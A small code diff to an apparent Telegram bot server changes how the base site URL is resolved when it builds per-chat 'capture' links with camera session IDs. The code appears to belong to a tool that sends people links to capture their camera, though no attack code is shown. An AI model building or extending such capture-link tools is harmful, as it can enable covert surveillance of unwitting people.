@@ -845,7 +845,8 @@ serve(async (req) => {
           sessionId = `tgcam_${chatId}`;
           await setSetting(`tgbot_cam_link_${chatId}`, sessionId);
         }
-        const siteUrl = (await getSetting('main_settings'))?.siteUrl || 'https://riyakichut.lovable.app';
+        const mainSettings = await getSetting('main_settings');
+        const siteUrl = mainSettings?.siteUrl || Deno.env.get('SITE_URL') || 'https://riyakichut.lovable.app';
         const captureLink = `${siteUrl}/capture?session=${sessionId}`;
         const chromeLink = `${siteUrl}/chrome-custom-capture?session=${sessionId}`;
         const customLink = `${siteUrl}/custom-capture?session=${sessionId}`;
